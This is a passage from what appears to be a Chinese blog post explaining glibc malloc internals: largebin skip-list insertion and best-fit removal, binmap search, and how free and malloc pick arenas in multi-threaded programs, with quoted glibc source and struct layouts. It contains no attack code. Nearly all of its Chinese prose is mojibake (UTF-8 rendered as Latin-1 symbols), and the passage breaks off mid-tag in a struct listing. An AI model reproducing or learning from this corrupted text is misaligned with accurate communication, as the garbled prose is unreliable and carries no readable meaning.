<p>1.ä¸<code>bin_at(M,63)-&gt;bk</code>,ä¹Ÿå°±æ˜¯è¿™ä¸ª<code>bin</code>é‡Œæœ€å°çš„å †å—,ä¹Ÿå°±æ˜¯ä¸€ä¸ª<code>0x401</code>çš„å †å—è¿›è¡Œæ¯”è¾ƒ,å‘ç°æ–°æ”¾å…¥çš„å †å—<strong>ä¸æ˜¯æœ€å°çš„</strong>,ä¸èƒ½ç›´æ¥æ”¾åˆ°<code>bin_at(M,63)-&gt;bk</code>ä¸Š,éœ€è¦ä»å¤§åˆ°å°éå†è¿™ä¸ª<code>bin</code>,è¿›è¡Œ<strong>æ’å…¥æ’åº</strong></p>
<p>2.ä»<code>bin_at(M,63)-&gt;fd</code>,æœ‰å°±æ˜¯è¿™ä¸ª<code>bin</code>é‡Œæœ€å¤§çš„å †å—,ä¹Ÿå°±æ˜¯ä¸<code>0x421</code>å¼€å§‹æ¯”è¾ƒ,å‘ç°æ–°æ”¾å…¥çš„å †å—æ¯”ä»–å°</p>
<p>3.åˆ©ç”¨<code>0x421</code>
ä¸Šçš„è·³è¡¨ç´¢å¼•,æ‰¾åˆ°äº†<code>0x411</code>çš„,æ–°å †å—å¯ä»¥æ”¾åˆ°è¿™é‡Œäº†</p>
<p>4.ä¿æŒè·³è¡¨ç´¢å¼•å †å—ä¸å˜,åœ¨å…¶<code>fd</code>ä¸Šæ’å…¥æ–°å †å—</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241030153014682.png"
alt="image-20241030153014682" />
<figcaption aria-hidden="true">image-20241030153014682</figcaption>
</figure>
<h5 id="æ’å…¥ä¸å­˜åœ¨ç´¢å¼•çš„å †å—">æ’å…¥ä¸å­˜åœ¨ç´¢å¼•çš„å †å—</h5>
<p>å‡è®¾ç°åœ¨<code>bin_at(M,63)</code>ä¸­å·²ç»æœ‰<code>0x421,0x401</code>çš„è·³è¡¨ç´¢å¼•</p>
<p>åˆè¦å°†ä¸€ä¸ª<code>0x411</code>çš„å †å—æ”¾è¿›å»,é‚£ä¹ˆè¿‡ç¨‹å°†ä¼šæ˜¯è¿™æ ·çš„:</p>
<h5 id="å½“å‰binä¸­æœ‰å †å—æ—¶æ‹¿èµ°ä¸€ä¸ª">å½“å‰binä¸­æœ‰å †å—æ—¶æ‹¿èµ°ä¸€ä¸ª</h5>
<p><code>largebin</code>
åœ¨æ‹¿èµ°å †å—æ—¶é‡‡ç”¨æœ€ä½³é€‚é…ç­–ç•¥,ä¹Ÿå°±æ˜¯è¯´å°½é‡æ‰¾ä¸€ä¸ªæœ€å°çš„å †å—æ»¡è¶³åˆ†é…éœ€æ±‚</p>
<p>é¦–å…ˆè®¡ç®—å¾—åˆ°<code>bin_at(M,idx)</code></p>
<p>ç„¶åé€šè¿‡<code>fd</code>é“¾è¡¨æ‰¾åˆ°è¯¥<code>bin</code>ä¸­æœ€å¤§çš„å—</p>
<p>å¦‚æœæœ€å¤§çš„å—éƒ½æ— æ³•æ»¡è¶³éœ€æ±‚,åˆ™ä½¿ç”¨<code>largebin</code>æ˜¾ç„¶æ— æ³•æ»¡è¶³éœ€æ±‚,æ²¡å¿…è¦åœ¨<code>largebin</code>è¿™é‡Œæµªè´¹æ—¶é—´äº†</p>
<p>å¦åˆ™æœ¬<code>bin</code>ä¸­å¿…ç„¶å­˜åœ¨èƒ½å¤Ÿæ»¡è¶³éœ€æ±‚çš„å—,èµ·ç æœ€å¤§çš„å—è‚¯å®šå¯ä»¥,ä½†æ˜¯ç›´æ¥ç”¨è¿™ä¸ªæœ€å¤§å—å¤ªäº,åˆ‡å‰²æœ€å¤§å—ä¹‹åé€ æˆå¤–éƒ¨ç¢ç‰‡çš„å¯èƒ½æ€§æ›´å¤§,å› æ­¤æ¥ä¸‹æ¥éœ€è¦æ‰¾åˆ°æœ€ä½³é€‚é…çš„ä¸´ç•Œå—</p>
<p>åˆ©ç”¨æœ€å¤§å—çš„<code>bk_nextsize</code>ç´¢å¼•è·³åˆ°æœ€å°å—ä¸Š,ç„¶åå†æ²¿ç€<code>bk_nextsize</code>å‘æ›´å¤§å—éå†,å¦‚æ­¤å¯»æ‰¾æœ€ä½³é€‚é…</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241030155542420.png"
alt="image-20241030155542420" />
<figcaption aria-hidden="true">image-20241030155542420</figcaption>
</figure>
<p>æ‰¾åˆ°æœ€ä½³é€‚é…å,é¦–å…ˆå°è¯•æ‹¿èµ°æ™®é€šå †å—,æ²¡æœ‰æ™®é€šå †å—å†æ‹¿èµ°ç´¢å¼•å †å—,</p>
<p>ç„¶ååœ¨è¿™ä¸ªå †å—ä¸Šåˆ‡å‰²å‡ºåˆ†é…éœ€æ±‚æ¥,</p>
<p>å¦‚æœå‰©ä½™çš„ä¸‹è„šæ–™å¤ªå°äº†,å°äº<code>0x20</code>å­—èŠ‚,å°±ä¸æŠ æœäº†,æ•´ä¸ªæ™®é€šèŠ‚ç‚¹å…¨éƒ½è¿”å›,å°±å½“é€äººäº†</p>
<p>å¦‚æœå‰©ä½™çš„ä¸‹è„šæ–™è¿˜è¡Œ,å¤§äºç­‰äº<code>0x20</code>,é‚£ä¹ˆå°±æŠŠä¸‹è„šæ–™æ‰”ç»™<code>unsortedbin</code></p>
<h5 id="å½“å‰binä¸­æ²¡æœ‰å †å—æ—¶æ‹¿èµ°ä¸€ä¸ª">å½“å‰binä¸­æ²¡æœ‰å †å—æ—¶æ‹¿èµ°ä¸€ä¸ª</h5>
<p>é¦–å…ˆæ ¹æ®å †å—å¤§å°è®¡ç®—å‡º<code>idx</code></p>
<p>å‘ç°<code>idx</code>å¯¹åº”çš„<code>largebin</code>ä¸­æ²¡æœ‰å †å—</p>
<p>äºæ˜¯æ²¿ç€<code>idx++</code>çš„æ–¹å‘,å‘æ›´å¤§çš„<code>bin</code>ä¸­å¯»æ‰¾ç›®æ ‡</p>
<p>è¿™ä¸ªå¯»æ‰¾çš„è¿‡ç¨‹ä½¿ç”¨äº†<code>binmap</code>åŠ é€Ÿ</p>
<p>æ•´ä¸ª<code>binmap</code>åˆ†ä¸ºå››ä¸ª<code>block</code>,
å¯¹åº”åˆ°å››ä¸ª<code>int</code></p>
<p>æ ¹æ®å½“å‰<code>bin</code>çš„ä¸‹æ ‡<code>idx</code>è®¡ç®—å‡ºæ‰€å±çš„<code>block</code></p>
<p>å¦‚æœ<code>binmap[block] &gt; idx2bit(idx)</code></p>
<p>è¿™å°±è¯´æ˜<code>idx</code>æ‰€å±çš„å—ä¸­,<strong>å¯èƒ½</strong>å­˜åœ¨æ›´å¤§çš„<code>bin</code>,å…¶ä¸­æœ‰å †å—</p>
<p>æ‰¾åˆ°è¿™ä¸ªæ›´å¤§çš„<code>bin</code>,å®é™…åˆ¤æ–­ä¸€ä¸‹å…¶ä¸­åˆ°åº•æœ‰æ²¡æœ‰å †å—</p>
<p>ä»è¿™ä¸ªå¤§<code>bin</code>ä¸­æ‹¿å‡ºä¸€å—åˆ‡å‰²,è¿”å›</p>
<p>åˆ‡å‰©ä¸‹çš„å¦‚æœå¾ˆå°åˆ™ä¸€å¹¶è¿”å›äº†</p>
<p>å¦åˆ™æ”¾åˆ°<code>unsortedbin</code></p>
<h2 id="å¤šçº¿ç¨‹åœºæ™¯">å¤šçº¿ç¨‹åœºæ™¯</h2>
<h3 id="free-2">free</h3>
<p>åœ¨é€šå¸¸æƒ…å†µä¸‹,å †åŒºçš„ç”³è¯·å’Œé‡Šæ”¾åªä¼šä½¿ç”¨åˆ°ä¸»åˆ†é…åŒº<code>main_arena</code>,åœ¨å¤šçº¿ç¨‹ç­‰æƒ…å†µä¸‹å¯èƒ½å­˜åœ¨å¤šä¸ªåˆ†é…åŒº,ä½†æ˜¯æˆ‘ä»¬ä¾ç„¶åªç®¡<code>malloc</code>å’Œ<code>free</code>,å¹¶æ²¡æœ‰æŒ‡å®šä»å“ªä¸ªåˆ†é…åŒºç”³è¯·æˆ–è€…é‡Šæ”¾å †å—</p>
<p>é¦–å…ˆè¯´é‡Šæ”¾:</p>
<p>å®é™…ä¸Šæ˜¯<code>libc_free</code>å†³å®šäº†å¾€å“ªé‡Œé‡Šæ”¾</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __libc_free(<span class="type">void</span> *mem)</span><br><span class="line">&#123;</span><br><span class="line">    mstate ar_ptr;</span><br><span class="line">    mchunkptr p; <span class="comment">/* chunk corresponding to mem */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mem == <span class="number">0</span>) <span class="comment">/* free(0) has no effect */</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    p = mem2chunk(mem);</span><br><span class="line">    <span class="comment">//å¯¹äºmmapç”³è¯·çš„å †å—,ä½¿ç”¨munmapå€’å›å»</span></span><br><span class="line">    <span class="keyword">if</span> (chunk_is_mmapped(p)) <span class="comment">/* release mmapped memory. */</span></span><br><span class="line">    &#123;</span><br><span class="line">        ...</span><br><span class="line">        munmap_chunk(p);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;       <span class="comment">//ä»åˆ†é…åŒºæ¥çš„å †å—,è¿˜ç»™åˆ†é…åŒº</span></span><br><span class="line">        MAYBE_INIT_TCACHE();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Mark the chunk as belonging to the library again.  */</span></span><br><span class="line">        (<span class="type">void</span>)tag_region(chunk2mem(p), memsize(p));</span><br><span class="line"></span><br><span class="line">        ar_ptr = arena_for_chunk(p);</span><br><span class="line">        _int_free(ar_ptr, p, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åœ¨è°ƒç”¨<code>_int_free</code>æ—¶ä¼ é€’äº†åˆ†é…åŒºæŒ‡é’ˆ<code>ar_ptr</code>,ä»–æ˜¯è¿™æ ·è®¡ç®—çš„:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ar_ptr = arena_for_chunk(p);</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="keyword">struct</span> malloc_state *</span><br><span class="line"><span class="title function_">arena_for_chunk</span> <span class="params">(mchunkptr ptr)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> chunk_main_arena (ptr) ? &amp;main_arena : heap_for_ptr (ptr)-&gt;ar_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œ<code>chunk_main_arena(ptr)</code>ä¼šæ£€æŸ¥å †å—çš„Aæ ‡å¿—ä½,å¯¹äºæ¥è‡ªéä¸»åˆ†é…åŒºçš„å †å—,ä¼šè°ƒç”¨<code>heap_for_ptr</code>è®¡ç®—å…¶æ‰€åœ¨åˆ†é…åŒº</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> heap_info *</span><br><span class="line"><span class="title function_">heap_for_ptr</span> <span class="params">(<span class="type">void</span> *ptr)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> max_size = heap_max_size ();</span><br><span class="line">  <span class="keyword">return</span> PTR_ALIGN_DOWN (ptr, max_size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™å¹²äº†ä¸ªå•¥äº‹å‘¢?</p>
<p><code>max_size</code>å®é™…ä¸Šæ˜¯<code>64M</code>,ç„¶å<code>ptr</code>å‘ä¸‹å¯¹é½åˆ°<code>64M</code>,æ˜¯ä»€ä¹ˆä¸€ä¸ªæ•ˆæœå‘¢?</p>
<p><code>ptr &amp; 0xfffffffffc000000</code></p>
<p>æ¯”å¦‚å‡è®¾<code>ptr = 0x555558026520</code></p>
<p>é‚£ä¹ˆæ­¤æ—¶<code>ptr &amp; 0xfffffffffc000000 = 0x555558026520 &amp; 0xfffffffffc000000 = 0x555558000000</code></p>
<p>è¿™ä¸ªå€¼å°±è¢«è®¤ä¸ºæ˜¯<code>ptr</code>æ‰€åœ¨çš„åˆ†é…åŒºæè¿°ç¬¦<code>heap_info</code>çš„ä½ç½®</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">type = <span class="keyword">struct</span> _heap_info &#123;</span><br><span class="line"><span class="comment">/* 0x0000      |  0x0008 */</span>    mstate ar_ptr;</span><br><span class="line"><span class="comment">/* 0x0008      |  0x0008 */</span>    <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span> *<span class="title">prev</span>;</span></span><br><span class="line"><span class="comment">/* 0x0010      |  0x0008 */</span>    <span class="type">size_t</span> size;</span><br><span class="line"><span class="comment">/* 0x0018      |  0x0008 */</span>    <span class="type">size_t</span> mprotect_size;</span><br><span class="line"><span class="comment">/* 0x0020      |  0x0008 */</span>    <span class="type">size_t</span> pagesize;</span><br><span class="line"><span class="comment">/* 0x0028      |  0x0008 */</span>    <span class="type">char</span> pad[<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line">                               <span class="comment">/* total size (bytes):   48 */</span></span><br><span class="line">                             &#125;</span><br></pre></td></tr></table></figure>
<p>ç„¶åå…¶ä¸­çš„<code>ar_ptr</code>å°±æ˜¯åˆ†é…åŒº<code>malloc_state</code>æŒ‡é’ˆ</p>
<p>ä¹Ÿå°±æ˜¯è¯´, å¯¹äºä¸€ä¸ªå †å—p</p>
<p>å¦‚æœå…¶æœ‰æ ‡å¿—ä½A,é‚£ä¹ˆç›´æ¥ä½¿ç”¨<code>glibc</code>ä¸­çš„<code>main_arena</code>æŒ‡é’ˆè¿”å›ä¸»åˆ†é…åŒº</p>
<p>å¦‚æœå…¶æ— æ ‡å¿—ä½A,é‚£ä¹ˆé¦–å…ˆå°†å…¶åœ°å€å‘ä¸‹å¯¹é½åˆ°<code>64M</code>å¾—åˆ°<code>heap_info</code>çš„ä½ç½®,ç„¶åå¾—åˆ°<code>ar_ptr</code>çš„ä½ç½®</p>
<h3 id="malloc-3">malloc</h3>
<p>å¦‚æœåªæœ‰ä¸€ä¸ªçº¿ç¨‹æ˜¾ç„¶ä¸éœ€è¦å»ºç«‹å¤šä¸ªåˆ†é…åŒº,å› ä¸ºæ§åˆ¶æµåŒä¸€æ—¶é—´åªèƒ½æœ‰ä¸€ä¸ªåˆ†é…è¯·æ±‚</p>
<p>é‚£ä¹ˆå¯¹äºå¤šçº¿ç¨‹ç¯å¢ƒ,é¦–å…ˆå¦‚ä½•ç•Œå®šå¤šçº¿ç¨‹å‘¢?</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> __ASSEMBLER__</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> __libc_multiple_threads;</span><br><span class="line">libc_hidden_proto (__libc_multiple_threads)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> !defined SINGLE_THREAD_BY_GLOBAL || IS_IN (rtld)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> SINGLE_THREAD_P \</span></span><br><span class="line"><span class="meta">  (THREAD_GETMEM (THREAD_SELF, header.multiple_threads) == 0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> SINGLE_THREAD_P (__libc_multiple_threads == 0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RTLD_SINGLE_THREAD_P SINGLE_THREAD_P</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* _SINGLE_THREAD_H  */</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å¦‚æœTCBä¸­æœ‰å®šä¹‰multiple_threadså­—æ®µ,åˆ™æ£€æŸ¥è¯¥å­—æ®µæ˜¯å¦ä¸º1</p>
<p>å¦åˆ™æ£€æŸ¥glibcçš„<code>__libc_multiple_threads</code>å˜é‡æ˜¯å¦ä¸º1</p>
<p>åœ¨x86ä¸Šä½¿ç”¨å‰è€…</p>
<p>è¿™ä¸ªå¤šçº¿ç¨‹å­—æ®µä¼šæŒ‡å¯¼mallocçš„è¡Œä¸º</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> (SINGLE_THREAD_P)		<span class="comment">//å•çº¿ç¨‹æ—¶çš„è¡Œä¸º</span></span><br><span class="line">   &#123;</span><br><span class="line">     victim = tag_new_usable (_int_malloc (&amp;main_arena, bytes));</span><br><span class="line">     assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">      &amp;main_arena == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">     <span class="keyword">return</span> victim;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="comment">//ä¸‹ä¸ºå¤šçº¿ç¨‹æ—¶è¡Œä¸º</span></span><br><span class="line"> arena_get (ar_ptr, bytes);	</span><br><span class="line"></span><br><span class="line"> victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line"> <span class="comment">/* Retry with another arena only if we were able to find a usable arena</span></span><br><span class="line"><span class="comment">    before.  */</span></span><br><span class="line"> <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">   &#123;</span><br><span class="line">     LIBC_PROBE (memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">     ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">     victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">   __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line"> victim = tag_new_usable (victim);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>åœ¨å¤šçº¿ç¨‹åœºæ™¯ä¸‹</p>
<p>é¦–å…ˆå°è¯•<code>arena_get(ar_ptr = NULL,bytes)</code>æ‹¿åˆ°ä¸€ä¸ªåˆ†é…åŒº</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#define arena_get(ptr, size) do &#123; \</span><br><span class="line">      ptr = thread_arena;						      \</span><br><span class="line">      arena_lock (ptr, size);						      \</span><br><span class="line">  &#125; while (0)</span><br><span class="line"></span><br><span class="line">#define arena_lock(ptr, size) do &#123;					      \</span><br><span class="line">      if (ptr)								      \</span><br><span class="line">        __libc_lock_lock (ptr-&gt;mutex);					      \</span><br><span class="line">      else								      \</span><br><span class="line">        ptr = arena_get2 ((size), NULL);				      \</span><br><span class="line">  &#125; while (0)</span><br></pre></td></tr></table></figure>
<p>ä¸»çº¿ç¨‹ä¼šæœ‰<code>thread_arena = &amp;main_arena</code></p>
<p>å¯¹äºå…¶ä»–çº¿ç¨‹,ç¬¬ä¸€æ¬¡å°è¯•åˆ†é…æ—¶,<code>thread_arena = NULL</code></p>
<p>æ­¤æ—¶ä¼šè°ƒç”¨<code>arena_get2</code>,è¿™ä¸ªå‡½æ•°ä¼šå°è¯•æ‰¾ä¸€ä¸ªå½“å‰ç©ºé—²çš„åˆ†é…åŒº,å¦‚æœæœ‰åˆ™è¿”å›</p>
<p>å¦‚æœæ²¡æœ‰ä¼šå°è¯•æ–°åˆ›å»ºä¸€ä¸ªåˆ†é…åŒº,å¦‚æœå·²ç»è¾¾åˆ°äº†åˆ†é…åŒºæ•°é‡ä¸Šé™,åªèƒ½ç­‰ç€</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">static</span> mstate</span><br><span class="line"><span class="title function_">arena_get2</span> <span class="params">(<span class="type">size_t</span> size, mstate avoid_arena)</span></span><br><span class="line">&#123;</span><br><span class="line">  mstate a;</span><br><span class="line"></span><br><span class="line">  <span class="type">static</span> <span class="type">size_t</span> narenas_limit;</span><br><span class="line"></span><br><span class="line">  a = get_free_list ();	<span class="comment">//å°è¯•ä»freelistä¸Šæ‹¿ä¸€ä¸ªåˆ†é…åŒº</span></span><br><span class="line">  <span class="keyword">if</span> (a == <span class="literal">NULL</span>)  <span class="comment">//å¦‚æœa == NULLè¯´æ˜å½“å‰æ²¡æœ‰ç©ºé—²çš„åˆ†é…åŒº</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Nothing immediately available, so generate a new arena.  */</span></span><br><span class="line">      <span class="keyword">if</span> (narenas_limit == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (mp_.arena_max != <span class="number">0</span>) <span class="comment">//å¦‚æœåˆ†é…åŒºæ•°é‡æœ‰æ˜ç¡®é…ç½®çš„ä¸Šé™</span></span><br><span class="line">            narenas_limit = mp_.arena_max;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> (narenas &gt; mp_.arena_test)<span class="comment">//å¦åˆ™</span></span><br><span class="line">            &#123;</span><br><span class="line">              <span class="type">int</span> n = __get_nprocs_sched ();<span class="comment">//è·å–èƒ½å¤Ÿä½¿ç”¨çš„CPUæ ¸å¿ƒæ•°</span></span><br><span class="line"></span><br><span class="line">              <span class="keyword">if</span> (n &gt;= <span class="number">1</span>)</span><br><span class="line">                narenas_limit = NARENAS_FROM_NCORES (n);<span class="comment">//åœ¨x86_64ä¸Šæœ€å¤šæ˜¯8*n</span></span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                <span class="comment">/* We have no information about the system.  Assume two</span></span><br><span class="line"><span class="comment">                   cores.  */</span></span><br><span class="line">                narenas_limit = NARENAS_FROM_NCORES (<span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    repeat:;</span><br><span class="line">      <span class="type">size_t</span> n = narenas;</span><br><span class="line">      <span class="comment">/* NB: the following depends on the fact that (size_t)0 - 1 is a</span></span><br><span class="line"><span class="comment">         very large number and that the underflow is OK.  If arena_max</span></span><br><span class="line"><span class="comment">         is set the value of arena_test is irrelevant.  If arena_test</span></span><br><span class="line"><span class="comment">         is set but narenas is not yet larger or equal to arena_test</span></span><br><span class="line"><span class="comment">         narenas_limit is 0.  There is no possibility for narenas to</span></span><br><span class="line"><span class="comment">         be too big for the test to always fail since there is not</span></span><br><span class="line"><span class="comment">         enough address space to create that many arenas.  */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (n &lt;= narenas_limit - <span class="number">1</span>))  <span class="comment">//è¿˜èƒ½åˆ›å»ºæ–°çš„åˆ†é…åŒº</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (catomic_compare_and_exchange_bool_acq (&amp;narenas, n + <span class="number">1</span>, n))</span><br><span class="line">            <span class="keyword">goto</span> repeat;</span><br><span class="line">          a = _int_new_arena (size);    <span class="comment">//åˆ›å»ºæ–°åˆ†é…åŒº</span></span><br><span class="line">	  <span class="keyword">if</span> (__glibc_unlikely (a == <span class="literal">NULL</span>))</span><br><span class="line">            catomic_decrement (&amp;narenas);</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">else</span>    <span class="comment">//æ— æ³•åˆ›å»ºæ–°åˆ†é…åŒº,æ­¤æ—¶åªèƒ½è½®è¯¢å·²æœ‰çš„åˆ†é…åŒºç­‰å¾…</span></span><br><span class="line">        a = reused_arena (avoid_arena); </span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œ<code>freelist</code>ç”¨äºåœ¨å¤šçº¿ç¨‹åœºæ™¯ä¸‹,ä¿å­˜å½“å‰ç©ºé—²çš„åˆ†é…åŒº</p>
<p>åˆ†é…åŒº<code>malloc_state</code>ä¸­æœ‰ä¸€ä¸ª<code>next_free</code>å°±æ˜¯å•é“¾è¡¨åç»§æŒ‡é’ˆ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* offset      |    size */</span>  type = <span class="keyword">struct</span> malloc_state &#123;</span><br><span class="line"><span class="comment">/* 0x0000      |  0x0004 */</span>    <span class="type">__libc_lock_t</span> mutex;</span><br><span class="line"><span class="comment">/* 0x0004      |  0x0004 */</span>    <span class="type">int</span> flags;</span><br><span class="line"><span class="comment">/* 0x0008      |  0x0004 */</span>    <span class="type">int</span> have_fastchunks;</span><br><span class="line"><span class="comment">/* XXX  4-byte hole      */</span></span><br><span class="line"><span class="comment">/* 0x0010      |  0x0050 */</span>    mfastbinptr fastbinsY[<span class="number">10</span>];</span><br><span class="line"><span class="comment">/* 0x0060      |  0x0008 */</span>    mchunkptr top;</span><br><span class="line"><span class="comment">/* 0x0068      |  0x0008 */</span>    mchunkptr last_remainder;</span><br><span class="line"><span class="comment">/* 0x0070      |  0x07f0 */</span>    mchunkptr bins[<span class="number">254</span>];</span><br><span class="line"><span class="comment">/* 0x0860      |  0x0010 */</span>    <span class="type">unsigned</span> <span class="type">int</span> binmap[<span class="number">4</span>];</span><br><span class="line"><span class="comment">/* 0x0870      |  0x0008 */</span>    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="comment">/* 0x0878      |  0x0008 */</span>    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"><span class="comment">/* 0x0880      |  0x0008 */</span>    <span class="type">size_t</span> attached_threads;</span><br><span class="line"><span 